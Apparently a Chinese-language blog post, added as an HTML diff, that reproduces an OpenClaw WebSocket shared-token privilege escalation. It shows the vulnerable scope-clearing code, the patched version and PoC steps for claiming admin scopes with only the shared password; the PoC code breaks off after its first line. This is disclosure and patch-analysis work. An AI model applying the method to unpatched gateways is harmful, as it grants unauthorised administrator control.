@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="【复现】OpenClaw WebSocket共享令牌权限提升漏洞免责声明       文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 前言       2026 年 3 月 13 日，安全研究员 LUOYEcode 公开披露了一个严重的权限提升漏洞，CVSS 评分为 10.0。对评分如此高的漏洞突发好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【复现】OpenClaw WebSocket共享令牌权限提升漏洞">
+<meta property="og:url" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="【复现】OpenClaw WebSocket共享令牌权限提升漏洞免责声明       文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 前言       2026 年 3 月 13 日，安全研究员 LUOYEcode 公开披露了一个严重的权限提升漏洞，CVSS 评分为 10.0。对评分如此高的漏洞突发好">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/TCjrd_h0Jrm6F_KmFY33FglHzwTs-aJCsSm3m1I8U8U.png">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/l4XukLQkO4ZHAhe2opjrgv8fDzcWhkyDoODT66K85SM.png">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/XcVxs5KNcFQ79mAapiavYBL1T_AZuk6mEQzni5sy-5Q.png">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/OsbDuJijyd0QndL3UhTOwQ1MKGMNN9onaPYBqFnofuc.png">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1ItdGgd5bdakLF_xSw-6E9dJL9QTWD_NwXTktI4xt4I.png">
+<meta property="og:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/e5Pb7oMh--FfBUmkyuKmW3F-Aub24vGQURejrDI8050.png">
+<meta property="article:published_time" content="2025-08-13T13:40:49.000Z">
+<meta property="article:modified_time" content="2026-04-01T13:25:47.298Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="权限提升">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/TCjrd_h0Jrm6F_KmFY33FglHzwTs-aJCsSm3m1I8U8U.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【复现】OpenClaw WebSocket共享令牌权限提升漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91Cherry%20Studio%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2025-54074)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/05/13/%E6%89%8B%E6%9C%BA%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E8%AE%BE%E5%A4%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&text=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&is_video=false&description=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【复现】OpenClaw WebSocket共享令牌权限提升漏洞&body=Check out this article: https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&name=【复现】OpenClaw WebSocket共享令牌权限提升漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&t=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw-WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">【复现】OpenClaw WebSocket共享令牌权限提升漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.1.</span> <span class="toc-text">免责声明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">漏洞代码分析与原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞所在文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90%E5%A3%B0%E6%98%8E"><span class="toc-number">4.3.</span> <span class="toc-text">认证流程中的权限声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%88v2026-3-12%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">修复后的代码（v2026.3.12）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93"><span class="toc-number">4.5.</span> <span class="toc-text">漏洞原理总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-PoC"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用 PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">关键利用代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PoC"><span class="toc-number">5.2.</span> <span class="toc-text">运行 PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90"><span class="toc-number">5.3.</span> <span class="toc-text">复现结果分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%BD%B1%E5%93%8D%E7%A1%AE%E8%AE%A4"><span class="toc-number">6.</span> <span class="toc-text">攻击影响确认</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        【复现】OpenClaw WebSocket共享令牌权限提升漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-13T13:40:49.000Z" class="dt-published" itemprop="datePublished">2025-08-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="【复现】OpenClaw-WebSocket共享令牌权限提升漏洞"><a href="#【复现】OpenClaw-WebSocket共享令牌权限提升漏洞" class="headerlink" title="【复现】OpenClaw WebSocket共享令牌权限提升漏洞"></a>【复现】OpenClaw WebSocket共享令牌权限提升漏洞</h1><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>       文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>       2026 年 3 月 13 日，安全研究员 <strong>LUOYEcode</strong> 公开披露了一个严重的权限提升漏洞，CVSS 评分为 10.0。对评分如此高的漏洞突发好奇，于是乎和AI协助后一起快速复现了这个漏洞。该漏洞存在于 OpenClaw 网关的 WebSocket 连接认证流程中，允许持有共享令牌（shared token）或共享密码（shared password）的低权限用户通过自行声明管理员权限范围（scopes），绕过服务端的权限校验，从而获得完整的管理员控制权。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>受影响版本</td>
+<td>OpenClaw <strong>&lt;&#x3D; 2026.3.11</strong></td>
+</tr>
+<tr>
+<td>修复版本</td>
+<td>OpenClaw <strong>2026.3.12</strong></td>
+</tr>
+<tr>
+<td>漏洞公告</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rqpp-rjj8-7wv8">https://github.com/openclaw/openclaw/security/advisories/GHSA-rqpp-rjj8-7wv8</a></td>
+</tr>
+<tr>
+<td>修复 PR</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/openclaw/openclaw/pull/44306">https://github.com/openclaw/openclaw/pull/44306</a></td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>所有使用共享令牌或共享密码认证模式的 OpenClaw 网关部署</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞代码分析与原理"><a href="#漏洞代码分析与原理" class="headerlink" title="漏洞代码分析与原理"></a>漏洞代码分析与原理</h1><h2 id="漏洞所在文件"><a href="#漏洞所在文件" class="headerlink" title="漏洞所在文件"></a>漏洞所在文件</h2><p>       漏洞核心代码位于 src&#x2F;gateway&#x2F;server&#x2F;ws-connection&#x2F;message-handler.ts，该文件负责处理所有 WebSocket 连接的认证与消息分发。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>       在 v2026.3.11 版本中，clearUnboundScopes函数的条件守卫如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">clearUnboundScopes</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 条件守卫：只在 !controlUiAuthPolicy.allowBypass &amp;&amp; !sharedAuthOk 时清除</span></span><br><span class="line">    <span class="keyword">if</span> (scopes.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; !controlUiAuthPolicy.<span class="property">allowBypass</span> &amp;&amp; !sharedAuthOk) &#123;</span><br><span class="line">        scopes = [];</span><br><span class="line">        connectParams.<span class="property">scopes</span> = scopes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> handleMissingDeviceIdentity = (): <span class="function"><span class="params">boolean</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!device) &#123;</span><br><span class="line">        <span class="title function_">clearUnboundScopes</span>(); <span class="comment">// ← 在这里调用，但由于条件守卫会被跳过</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> trustedProxyAuthOk = <span class="title function_">isTrustedProxyControlUiOperatorAuth</span>(&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="TCjrd_h0Jrm6F_KmFY33FglHzwTs-aJCsSm3m1I8U8U.png" alt="image"></p>
+<p>       问题在于**!sharedAuthOk<strong>这个条件。对于通过共享令牌或密码成功认证的连接，</strong>sharedAuthOk<strong>的值为</strong>true<strong>，因此</strong>!sharedAuthOk<strong>为</strong>false<strong>，导致</strong>clearUnboundScopes()**永远不会真正执行。</p>
+<h2 id="认证流程中的权限声明"><a href="#认证流程中的权限声明" class="headerlink" title="认证流程中的权限声明"></a>认证流程中的权限声明</h2><p>       OpenClaw WebSocket 连接的认证流程如下（AI生成）：</p>
+<p><img src="l4XukLQkO4ZHAhe2opjrgv8fDzcWhkyDoODT66K85SM.png" alt="image"></p>
+<h2 id="修复后的代码（v2026-3-12）"><a href="#修复后的代码（v2026-3-12）" class="headerlink" title="修复后的代码（v2026.3.12）"></a>修复后的代码（v2026.3.12）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">clearUnboundScopes</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 移除了 !sharedAuthOk 条件守卫，无条件清除</span></span><br><span class="line">    <span class="keyword">if</span> (scopes.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        scopes = [];</span><br><span class="line">        connectParams.<span class="property">scopes</span> = scopes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> handleMissingDeviceIdentity = (): <span class="function"><span class="params">boolean</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// clearUnboundScopes 移到了 evaluateMissingDeviceIdentity 决策之后</span></span><br><span class="line">    <span class="keyword">const</span> trustedProxyAuthOk = <span class="title function_">isTrustedProxyControlUiOperatorAuth</span>(&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// ... 执行决策评估 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修复: 对所有无设备连接清除 scopes，仅保留 Control UI 例外</span></span><br><span class="line">    <span class="keyword">if</span> (!device &amp;&amp; (!isControlUi || decision.<span class="property">kind</span> !== <span class="string">&quot;allow&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_">clearUnboundScopes</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (decision.<span class="property">kind</span> === <span class="string">&quot;allow&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="XcVxs5KNcFQ79mAapiavYBL1T_AZuk6mEQzni5sy-5Q.png" alt="image"></p>
+<p>修复要点:</p>
+<p>1. 移除了clearUnboundScopes中的 !sharedAuthOk条件守卫</p>
+<p>2. 将 clearUnboundScopes()的调用移到设备身份评估决策之后</p>
+<p>3. 现在对所有无设备绑定的连接无条件清除客户端声明的 scopes</p>
+<p>4. 唯一例外：Control UI 路径（当isControlUi&#x3D;true且决策为allow时）</p>
+<h2 id="漏洞原理总结"><a href="#漏洞原理总结" class="headerlink" title="漏洞原理总结"></a>漏洞原理总结</h2><table>
+<thead>
+<tr>
+<th>要素</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>根因</strong></td>
+<td>clearUnboundScopes()的条件守卫 !sharedAuthOk导致共享认证连接的scopes永不被清除</td>
+</tr>
+<tr>
+<td><strong>触发条件</strong></td>
+<td>客户端使用共享令牌&#x2F;密码认证 + 不提供设备身份 + 自行声明 operator.admin</td>
+</tr>
+<tr>
+<td><strong>影响</strong></td>
+<td>攻击者可执行所有管理员级别的网关操作（配置修改、会话管理、节点控制等）</td>
+</tr>
+<tr>
+<td><strong>攻击复杂度</strong></td>
+<td>低 ——仅需知道共享令牌&#x2F;密码即可</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞利用-PoC"><a href="#漏洞利用-PoC" class="headerlink" title="漏洞利用 PoC"></a>漏洞利用 PoC</h1><p>       PoC 脚本 <code>poc.py</code>利用 OpenClaw 网关 WebSocket  协议实现权限提升攻击：</p>
+<p>1. 与目标网关建立 WebSocket 连接</p>
+<p>2. 接收服务端发送的 connect.challenge质询</p>
+<p>3. 发送 connect请求，携带共享密码认证 + scopes: [“operator.admin”] + 不提供设备身份</p>
+<p>4. 认证成功后，调用多个管理员级别 RPC 方法验证权限提升</p>
+<h2 id="关键利用代码"><a href="#关键利用代码" class="headerlink" title="关键利用代码"></a>关键利用代码</h2><p>       POC脚本已上传至GitHub：<a target="_blank" rel="noopener" href="https://github.com/Garck3h/GHSA-rqpp-rjj8-7wv8">https://github.com/Garck3h/GHSA-rqpp-rjj8-7wv8</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 核心利用载荷: 认证请求中声明管理员权限 + 不绑定设备</span><br><span class="line">connect_msg = &#123;</span><br><span class="line">    